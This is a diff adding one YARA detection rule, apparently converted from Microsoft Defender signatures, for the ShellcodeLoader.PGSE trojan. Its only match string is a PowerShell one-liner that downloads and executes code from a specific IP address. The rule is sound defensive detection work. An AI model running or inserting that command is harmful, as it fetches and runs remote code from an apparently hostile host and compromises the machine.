@@ -215,3 +215,24 @@ rule Trojan_Win64_ShellcodeLoader_AHC_2147959272_0
         (all of ($x*))
 }
 
+rule Trojan_Win64_ShellcodeLoader_PGSE_2147963308_0
+{
+    meta:
+        author = "defender2yara"
+        detection_name = "Trojan:Win64/ShellcodeLoader.PGSE!MTB"
+        threat_id = "2147963308"
+        type = "Trojan"
+        platform = "Win64: Windows 64-bit platform"
+        family = "ShellcodeLoader"
+        severity = "Critical"
+        info = "MTB: Microsoft Threat Behavior"
+        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
+        threshold = "5"
+        strings_accuracy = "High"
+    strings:
+        $x_5_1 = "powershell -c \"iex(iwr -Uri '91.92.240.219' -UseBasicParsing)" ascii //weight: 5
+    condition:
+        (filesize < 20MB) and
+        (all of ($x*))
+}
+
